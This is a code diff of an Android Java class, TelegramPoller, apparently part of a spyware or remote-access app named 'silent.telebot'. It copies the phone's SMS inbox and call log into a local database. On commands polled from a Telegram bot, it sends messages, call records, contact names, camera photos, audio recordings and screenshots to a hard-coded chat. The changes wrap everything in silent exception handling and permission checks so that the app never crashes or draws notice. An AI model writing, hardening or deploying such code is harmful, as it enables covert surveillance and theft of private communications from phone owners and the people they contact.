@@ -1,14 +1,11 @@
 package com.silent.telebot;
 
 import android.content.ContentResolver;
-import android.content.ContentValues;
 import android.content.Context;
-import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
-import android.os.Environment;
-import android.os.StatFs;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
@@ -43,13 +40,17 @@ public class TelegramPoller implements Runnable {
 
     public TelegramPoller(Context ctx) {
         this.ctx = ctx;
-        this.dbHelper = new DatabaseHelper(ctx);
+        try {
+            this.dbHelper = new DatabaseHelper(ctx);
+        } catch (Exception e) {
+            Log.e("TelegramPoller", "فشل تهيئة قاعدة البيانات: " + e.getMessage());
+        }
     }
 
     @Override
     public void run() {
         try {
-            // 1. مزامنة البيانات من الهاتف إلى SQLite
+            // 1. مزامنة البيانات (مع حماية كاملة من التعطل)
             syncDataFromPhone();
 
             // 2. جلب الأوامر من تيليجرام
@@ -80,122 +81,186 @@ public class TelegramPoller implements Runnable {
                 }
             }
         } catch (Exception e) {
-            Log.e("TelegramPoller", "Error: " + e.getMessage());
+            Log.e("TelegramPoller", "خطأ رئيسي: " + e.getMessage());
         }
     }
 
     // ============================================================
-    //  🔄 المزامنة
+    //  🔄 المزامنة (محمية بالكامل ضد التعطل)
     // ============================================================
     private void syncDataFromPhone() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+        // التحقق من وجود الأذونات قبل محاولة القراءة
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (ctx.checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+                return; // لا أذونات، نخرج بأمان
+            }
+            if (ctx.checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+                return;
+            }
+        }
+
+        // مزامنة الرسائل
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+                ContentResolver cr = ctx.getContentResolver();
+                Cursor cursor = null;
+                try {
+                    cursor = cr.query(Telephony.Sms.Inbox.CONTENT_URI,
+                            new String[]{"_id", "address", "body", "date"},
+                            null, null, "date DESC");
+                    if (cursor != null && cursor.moveToFirst() && dbHelper != null) {
+                        do {
+                            try {
+                                long id = cursor.getLong(0);
+                                String address = cursor.getString(1);
+                                String body = cursor.getString(2);
+                                long date = cursor.getLong(3);
+                                if (address != null && body != null) {
+                                    dbHelper.insertSms(id, address, body, date);
+                                }
+                            } catch (Exception ignored) {}
+                        } while (cursor.moveToNext());
+                    }
+                } catch (Exception ignored) {}
+                finally { if (cursor != null) cursor.close(); }
+            }
+        } catch (Exception ignored) {}
+
+        // مزامنة المكالمات
+        try {
             ContentResolver cr = ctx.getContentResolver();
             Cursor cursor = null;
             try {
-                cursor = cr.query(Telephony.Sms.Inbox.CONTENT_URI,
-                        new String[]{"_id", "address", "body", "date"},
+                cursor = cr.query(CallLog.Calls.CONTENT_URI,
+                        new String[]{"_id", "number", "duration", "type", "date"},
                         null, null, "date DESC");
-                if (cursor != null && cursor.moveToFirst()) {
+                if (cursor != null && cursor.moveToFirst() && dbHelper != null) {
                     do {
-                        dbHelper.insertSms(cursor.getLong(0), cursor.getString(1), cursor.getString(2), cursor.getLong(3));
+                        try {
+                            long id = cursor.getLong(0);
+                            String number = cursor.getString(1);
+                            long duration = cursor.getLong(2);
+                            int type = cursor.getInt(3);
+                            long date = cursor.getLong(4);
+                            if (number != null) {
+                                dbHelper.insertCall(id, number, duration, type, date);
+                            }
+                        } catch (Exception ignored) {}
                     } while (cursor.moveToNext());
                 }
-            } catch (SecurityException ignored) {}
+            } catch (Exception ignored) {}
             finally { if (cursor != null) cursor.close(); }
-        }
-
-        ContentResolver cr = ctx.getContentResolver();
-        Cursor cursor = null;
-        try {
-            cursor = cr.query(CallLog.Calls.CONTENT_URI,
-                    new String[]{"_id", "number", "duration", "type", "date"},
-                    null, null, "date DESC");
-            if (cursor != null && cursor.moveToFirst()) {
-                do {
-                    dbHelper.insertCall(cursor.getLong(0), cursor.getString(1), cursor.getLong(2),
-                            cursor.getInt(3), cursor.getLong(4));
-                } while (cursor.moveToNext());
-            }
-        } catch (SecurityException ignored) {}
-        finally { if (cursor != null) cursor.close(); }
+        } catch (Exception ignored) {}
     }
 
     // ============================================================
-    //  📋 معالجة الأوامر
+    //  📋 معالجة الأوامر (مع حماية)
     // ============================================================
     private void handleCommand(String cmd) {
-        if (cmd.equals("/help")) {
-            sendMessage(CHAT_ID, "📋 **الأوامر**\n━━━━━━━━━━━━━━━━━━\n" +
-                    "📩 /get_sms - آخر 10 رسائل (محلية)\n" +
-                    "📞 /get_calls - آخر 10 مكالمات (محلية)\n" +
-                    "📷 /take_pic - التقاط صورة\n" +
-                    "🎤 /record - تسجيل صوتي (30ث)\n" +
-                    "🖥️ /screenshot - لقطة شاشة");
-        }
-        else if (cmd.equals("/get_sms")) {
-            sendMessage(CHAT_ID, getSmsFromLocalDB());
-        }
-        else if (cmd.equals("/get_calls")) {
-            sendMessage(CHAT_ID, getCallsFromLocalDB());
-        }
-        else if (cmd.equals("/take_pic")) {
-            capturePhoto();
-        }
-        else if (cmd.equals("/record")) {
-            startRecording();
-        }
-        else if (cmd.equals("/screenshot")) {
-            ScreenCaptureService.takeScreenshot(ctx, CHAT_ID, BOT_TOKEN);
-        }
-        else {
-            sendMessage(CHAT_ID, "❌ أمر غير معروف. استخدم /help");
+        try {
+            if (cmd.equals("/help")) {
+                sendMessage(CHAT_ID, "📋 **الأوامر**\n━━━━━━━━━━━━━━━━━━\n" +
+                        "📩 /get_sms - آخر 10 رسائل (محلية)\n" +
+                        "📞 /get_calls - آخر 10 مكالمات (محلية)\n" +
+                        "📷 /take_pic - التقاط صورة\n" +
+                        "🎤 /record - تسجيل صوتي (30ث)\n" +
+                        "🖥️ /screenshot - لقطة شاشة");
+            }
+            else if (cmd.equals("/get_sms")) {
+                sendMessage(CHAT_ID, getSmsFromLocalDB());
+            }
+            else if (cmd.equals("/get_calls")) {
+                sendMessage(CHAT_ID, getCallsFromLocalDB());
+            }
+            else if (cmd.equals("/take_pic")) {
+                capturePhoto();
+            }
+            else if (cmd.equals("/record")) {
+                startRecording();
+            }
+            else if (cmd.equals("/screenshot")) {
+                ScreenCaptureService.takeScreenshot(ctx, CHAT_ID, BOT_TOKEN);
+            }
+            else {
+                sendMessage(CHAT_ID, "❌ أمر غير معروف. استخدم /help");
+            }
+        } catch (Exception e) {
+            sendMessage(CHAT_ID, "❌ حدث خطأ: " + e.getMessage());
+            Log.e("TelegramPoller", "خطأ في الأمر: " + e.getMessage());
         }
     }
 
     // ============================================================
-    //  📩 SMS (من SQLite)
+    //  📩 SMS (من SQLite) - محمي
     // ============================================================
     private String getSmsFromLocalDB() {
-        List<Map<String, String>> list = dbHelper.getLastSms(10);
-        if (list.isEmpty()) return "📭 لا توجد رسائل محفوظة.";
-        StringBuilder sb = new StringBuilder("📩 **آخر 10 رسائل (محلية)**\n━━━━━━━━━━━━━━━━━━━━\n");
-        SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault());
-        for (Map<String, String> sms : list) {
-            String name = getContactName(sms.get("address"));
-            String display = (name != null) ? name : sms.get("address");
-            sb.append("👤 **").append(display).append("**\n");
-            sb.append("📝 ").append(sms.get("body")).append("\n");
-            sb.append("🕐 ").append(sdf.format(new Date(Long.parseLong(sms.get("date"))))).append("\n");
-            sb.append("━━━━━━━━━━━━━━━━━━━━\n");
+        try {
+            if (dbHelper == null) return "❌ قاعدة البيانات غير جاهزة.";
+            List<Map<String, String>> list = dbHelper.getLastSms(10);
+            if (list.isEmpty()) return "📭 لا توجد رسائل محفوظة.";
+            StringBuilder sb = new StringBuilder("📩 **آخر 10 رسائل (محلية)**\n━━━━━━━━━━━━━━━━━━━━\n");
+            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault());
+            for (Map<String, String> sms : list) {
+                try {
+                    String address = sms.get("address");
+                    String body = sms.get("body");
+                    String dateStr = sms.get("date");
+                    if (address == null || body == null || dateStr == null) continue;
+                    
+                    String name = getContactName(address);
+                    String display = (name != null) ? name : address;
+                    long dateMillis = Long.parseLong(dateStr);
+                    sb.append("👤 **").append(display).append("**\n");
+                    sb.append("📝 ").append(body).append("\n");
+                    sb.append("🕐 ").append(sdf.format(new Date(dateMillis))).append("\n");
+                    sb.append("━━━━━━━━━━━━━━━━━━━━\n");
+                } catch (Exception ignored) {}
+            }
+            return sb.toString();
+        } catch (Exception e) {
+            return "❌ خطأ في قراءة الرسائل: " + e.getMessage();
         }
-        return sb.toString();
     }
 
     // ============================================================
-    //  📞 CALLS (من SQLite)
+    //  📞 CALLS (من SQLite) - محمي
     // ============================================================
     private String getCallsFromLocalDB() {
-        List<Map<String, String>> list = dbHelper.getLastCalls(10);
-        if (list.isEmpty()) return "📭 لا توجد مكالمات محفوظة.";
-        StringBuilder sb = new StringBuilder("📞 **آخر 10 مكالمات (محلية)**\n━━━━━━━━━━━━━━━━━━━━\n");
-        SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault());
-        for (Map<String, String> call : list) {
-            String name = getContactName(call.get("number"));
-            String display = (name != null) ? name : call.get("number");
-            int type = Integer.parseInt(call.get("type"));
-            String typeStr = (type == CallLog.Calls.INCOMING_TYPE) ? "📥 وارد" :
-                             (type == CallLog.Calls.OUTGOING_TYPE) ? "📤 صادر" : "❌ فائتة";
-            sb.append("👤 **").append(display).append("**\n");
-            sb.append("📌 ").append(typeStr).append("\n");
-            sb.append("⏱️ ").append(formatDuration(Long.parseLong(call.get("duration")))).append("\n");
-            sb.append("🕐 ").append(sdf.format(new Date(Long.parseLong(call.get("date"))))).append("\n");
-            sb.append("━━━━━━━━━━━━━━━━━━━━\n");
+        try {
+            if (dbHelper == null) return "❌ قاعدة البيانات غير جاهزة.";
+            List<Map<String, String>> list = dbHelper.getLastCalls(10);
+            if (list.isEmpty()) return "📭 لا توجد مكالمات محفوظة.";
+            StringBuilder sb = new StringBuilder("📞 **آخر 10 مكالمات (محلية)**\n━━━━━━━━━━━━━━━━━━━━\n");
+            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault());
+            for (Map<String, String> call : list) {
+                try {
+                    String number = call.get("number");
+                    String durationStr = call.get("duration");
+                    String typeStr = call.get("type");
+                    String dateStr = call.get("date");
+                    if (number == null || durationStr == null || typeStr == null || dateStr == null) continue;
+
+                    String name = getContactName(number);
+                    String display = (name != null) ? name : number;
+                    int type = Integer.parseInt(typeStr);
+                    String typeDisplay = (type == CallLog.Calls.INCOMING_TYPE) ? "📥 وارد" :
+                                         (type == CallLog.Calls.OUTGOING_TYPE) ? "📤 صادر" : "❌ فائتة";
+                    long dateMillis = Long.parseLong(dateStr);
+                    sb.append("👤 **").append(display).append("**\n");
+                    sb.append("📌 ").append(typeDisplay).append("\n");
+                    sb.append("⏱️ ").append(formatDuration(Long.parseLong(durationStr))).append("\n");
+                    sb.append("🕐 ").append(sdf.format(new Date(dateMillis))).append("\n");
+                    sb.append("━━━━━━━━━━━━━━━━━━━━\n");
+                } catch (Exception ignored) {}
+            }
+            return sb.toString();
+        } catch (Exception e) {
+            return "❌ خطأ في قراءة المكالمات: " + e.getMessage();
         }
-        return sb.toString();
     }
 
     // ============================================================
-    //  📷 الكاميرا (التقاط صورة باستخدام Intent + FileProvider)
+    //  📷 الكاميرا - محمي
     // ============================================================
     private void capturePhoto() {
         try {
@@ -209,7 +274,6 @@ public class TelegramPoller implements Runnable {
             intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
             ctx.startActivity(intent);
 
-            // انتظر قليلاً ثم أرسل الصورة
             new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                 if (photoFile.exists() && photoFile.length() > 0) {
                     sendPhotoStatic(CHAT_ID, photoFile, BOT_TOKEN);
@@ -224,7 +288,7 @@ public class TelegramPoller implements Runnable {
     }
 
     // ============================================================
-    //  🎤 التسجيل الصوتي
+    //  🎤 التسجيل الصوتي - محمي
     // ============================================================
     private void startRecording() {
         try {
@@ -260,7 +324,7 @@ public class TelegramPoller implements Runnable {
     }
 
     // ============================================================
-    //  📤 دوال إرسال الملفات (ثابتة للاستخدام من الخدمات)
+    //  📤 دوال إرسال الملفات (ثابتة)
     // ============================================================
     public static void sendPhotoStatic(String chatId, File photoFile, String botToken) {
         try {
@@ -366,15 +430,16 @@ public class TelegramPoller implements Runnable {
     //  🔍 مساعدات
     // ============================================================
     private String getContactName(String phoneNumber) {
-        if (phoneNumber == null) return null;
-        ContentResolver cr = ctx.getContentResolver();
-        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
-        Cursor cursor = null;
+        if (phoneNumber == null || phoneNumber.isEmpty()) return null;
         try {
-            cursor = cr.query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
-            if (cursor != null && cursor.moveToFirst()) return cursor.getString(0);
+            ContentResolver cr = ctx.getContentResolver();
+            Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
+            Cursor cursor = null;
+            try {
+                cursor = cr.query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
+                if (cursor != null && cursor.moveToFirst()) return cursor.getString(0);
+            } finally { if (cursor != null) cursor.close(); }
         } catch (Exception ignored) {}
-        finally { if (cursor != null) cursor.close(); }
         return null;
     }
 
